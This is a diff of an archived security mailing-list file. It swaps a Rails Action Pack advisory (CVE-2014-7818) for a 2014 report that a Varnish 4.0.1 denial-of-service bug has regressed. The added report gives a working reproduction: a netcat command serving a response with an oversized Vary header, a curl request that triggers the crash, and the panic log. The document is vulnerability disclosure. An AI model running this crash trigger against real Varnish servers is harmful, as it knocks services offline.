@@ -1,71 +1,39 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/30/5
-Message-ID: <20141030184739.GB71386@TC.local>
-Date: Thu, 30 Oct 2014 11:47:39 -0700
-From: Aaron Patterson <tenderlove@...y-lang.org>
-To: rubyonrails-security@...glegroups.com, oss-security@...ts.openwall.com, secalert@...hat.com
-Subject: Arbitrary file existence disclosure in Action Pack (CVE-2014-7818)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/07/02/12
+Message-ID: <20140702165701.GA2493@dft-labs.eu>
+Date: Wed, 2 Jul 2014 17:57:01 +0100
+From: Marek Kroemeke <kroemeke@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: Varnish - no CVE == bug regression
 Content-Type: text/plain; charset=utf-8
 
-Arbitrary file existence disclosure in Action Pack
+Hi there,
 
-There is an information leak vulnerability in Action Pack. This vulnerability
-has been assigned the CVE identifier CVE-2014-7818.
+Latest version of Varnish cache (4.0.1 https://www.varnish-cache.org/ ) has 
+the same DoS vulnerability that 3.x had (which was subsequently fixed in 
+that branch). 
 
-Versions Affected:  >= 3.0.0
-Not affected:       <= 3.0.0
-Fixed Versions:     3.2.20, 4.0.11, 4.1.7, 4.2.0.beta3
+Any chance to allocate some CVEs for the below so that this 
+doesn't happen again ?
 
-Impact
-------
-Specially crafted requests can be used to determine whether a file exists on the filesystem that is outside the Rails application's root directory.  The files will not be served, but attackers can determine whether or not the file exists.
+http://seclists.org/fulldisclosure/2013/Mar/55
+http://seclists.org/fulldisclosure/2013/Mar/61
+http://seclists.org/fulldisclosure/2013/Mar/63
+http://seclists.org/fulldisclosure/2013/Mar/58
 
-This only impacts Rails applications that enable static file serving at
-runtime.  For example, the application's production configuration will say:
 
-  config.serve_static_assets = true
+How to replicate (assuming varnish proxies to port 8100) :
 
-All users running an affected release should either upgrade or use one of the work arounds immediately.
+"HTTP/1.1 200 foo\r\nVary: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n\r\n"  | nc.traditional -l -p8100
 
-Releases 
--------- 
-The 3.2.20, 4.0.11, 4.1.7 & 4.2.0.beta3 releases are available at the normal locations. 
+curl http://localhost:6081/
 
-Workarounds 
------------ 
-To work around this issue, set config.serve_static_assets = false in an initializer.  This work around will not be possible in all hosting environments and upgrading is advised.
+-- cut --
+Jul  2 18:32:09 localhost varnishd[6145]: Child (21893) Panic message:#012Assert error in http_GetHdr(), cache/cache_http.c line 347:#012  Condition(l == strlen(hdr + 1)) not true.#012thread = (cache-worker)#012ident = Linux,3.2.0-58-generic,x86_64,-smalloc,-smalloc,-hcritbit,epoll#012Backtrace:#012  0x42fdd9: pan_ic+0x1a0#012  0x426267: http_GetHdr+0x5b#012  0x43a951: VRY_Create+0x375#012  0x41c930: vbf_beresp2obj+0x40#012  0x41e766: vbf_fetch_thread+0x1949#012  0x432b7d: Pool_Work_Thread+0x5e8#012  0x4444da: wrk_thread_real+0xfc#012  0x444698: WRK_thread+0x16#012  0x7f21da3cfe9a: /lib/x86_64-linux-gnu/libpthread.so.0(+0x7e9a) [0x7f21da3cfe9a]#012  0x7f21da0fc3fd: /lib/x86_64-linux-gnu/libc.so.6(clone+0x6d) [0x7f21da0fc3fd]#012  busyobj = 0x7f21a4090a90 {#012    ws = 0x7f21a4090b50 {#012      id = "bo",#012      {s,f,r,e} = {0x7f21a4092a70,+456,(nil),+57376},#012    },#012  refcnt = 2#012  retries = 0#012  failed = 0#012  state = 1#012    is_do_stream#012    is_is_gunzip#012    bodystatus = 4 (eof),#012    },#012    http[bereq] = {#012      ws = 0x7f21a4090b50[bo]#012        "GET",#012        "/",#012        "HTTP/1.1",#012        "User-Agent: curl/7.22.0 (x86_64-pc-linux-gnu) libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3",#012        "Host: localhost:6081",#012        "Accept: */*",#012        "X-Forwarded-For: 127.0.0.1",#012        "Accept-Encoding: gzip",#012        "X-Varnish: 3",#012    },#012    http[beresp] = {#012      ws = 0x7f21a4090b50[bo]#012        "HTTP/1.1",#012        "200",#012        "foo",#012        "Vary: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",#012        "Date: Wed, 02 Jul 2014 16:32:07 GMT",#012    },#012    ws = 0x7f21a4090cd8 { BAD_MAGIC(0x00000000) },#012    },#012  objcore (FETCH) = 0x7f2198000950 {#012    refcnt = 2#012    flags = 0x2#012    objhead = 0x7f21980009e0#012  }#012  }#012
+-- cut --
 
-Patches 
-------- 
-To aid users who aren't able to upgrade immediately we have provided patches for the two supported release series.  They are in git-am format and consist of a single changeset. 
 
-* 3-1-sec-static-files.patch - Patch for the 3.1.x release series
-* 3-2-sec-static-files.patch - Patch for the 3.2.x release series
-* 4-0-sec-static-files.patch - Patch for the 4.0.x release series
-* 4-1-sec-static-files.patch - Patch for the 4.1.x release series
-
-Please note that only the 3.2.x, 4.0.x & 4.1.x  series are supported at present.  Users of earlier unsupported releases are advised to upgrade as soon as possible as we cannot guarantee the continued availability of security fixes for unsupported releases.
-
-Credits 
-------- 
-
-This vulnerability was reported by multiple researchers working independently.  Thanks to each of them for reporting the issue to us and verifying the fixes.
-
-* Eaden McKee
-* Dennis Hackethal & Christian Hansen of Crowdcurity
-* Juan C. Müller & Mike McClurg of Greenhouse.io 
-* Alex Ianus of Coinbase
-
--- 
-Aaron Patterson
-http://tenderlovemaking.com/
-
-View attachment "3-1-sec-static-files.patch" of type "text/plain" (3046 bytes)
-
-View attachment "3-2-sec-static-files.patch" of type "text/plain" (3086 bytes)
-
-View attachment "4-0-sec-static-files.patch" of type "text/plain" (3342 bytes)
-
-View attachment "4-1-sec-static-files.patch" of type "text/plain" (3343 bytes)
-
-Content of type "application/pgp-signature" skipped
+regards,
+AKAT-1
+22733db72ab3ed94b5f8a1ffcde850251fe6f466
+Marek Kroemeke
